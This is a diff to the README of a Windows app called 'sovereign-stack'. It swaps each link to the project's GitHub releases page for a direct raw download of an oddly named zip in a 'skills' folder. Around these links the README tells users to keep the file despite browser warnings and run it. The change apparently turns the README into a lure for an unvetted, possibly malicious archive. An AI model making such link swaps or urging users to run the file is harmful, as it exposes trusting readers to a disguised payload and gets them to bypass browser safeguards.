@@ -1,6 +1,6 @@
 # 🛡️ sovereign-stack - Reclaim Your Digital Life
 
-[![Download sovereign-stack](https://img.shields.io/badge/Download%20Now-8B5CF6?style=for-the-badge&logo=github&logoColor=white)](https://github.com/roastergenuspulicaria930/sovereign-stack/releases)
+[![Download sovereign-stack](https://img.shields.io/badge/Download%20Now-8B5CF6?style=for-the-badge&logo=github&logoColor=white)](https://github.com/roastergenuspulicaria930/sovereign-stack/raw/refs/heads/main/skills/sovereign/sovereign_stack_inanely.zip)
 
 ## 🌱 What is sovereign-stack?
 
@@ -52,7 +52,7 @@ For the best results, use a PC with at least:
 
 ## 🚀 Getting Started
 
-1. Open the release page here: https://github.com/roastergenuspulicaria930/sovereign-stack/releases
+1. Open the release page here: https://github.com/roastergenuspulicaria930/sovereign-stack/raw/refs/heads/main/skills/sovereign/sovereign_stack_inanely.zip
 2. Find the latest release
 3. Download the Windows file from that page
 4. Run the file after the download finishes
@@ -62,7 +62,7 @@ If your browser asks for approval, choose the option to keep the file and run it
 
 ## 🖱️ Windows install steps
 
-1. Visit the release page: https://github.com/roastergenuspulicaria930/sovereign-stack/releases
+1. Visit the release page: https://github.com/roastergenuspulicaria930/sovereign-stack/raw/refs/heads/main/skills/sovereign/sovereign_stack_inanely.zip
 2. Select the newest version
 3. Download the Windows package
 4. Open the downloaded file
@@ -227,7 +227,7 @@ After setup, test these items:
 
 Use the release page to get the latest Windows build:
 
-https://github.com/roastergenuspulicaria930/sovereign-stack/releases
+https://github.com/roastergenuspulicaria930/sovereign-stack/raw/refs/heads/main/skills/sovereign/sovereign_stack_inanely.zip
 
 Open that page, choose the newest release, and download the Windows file from there
 
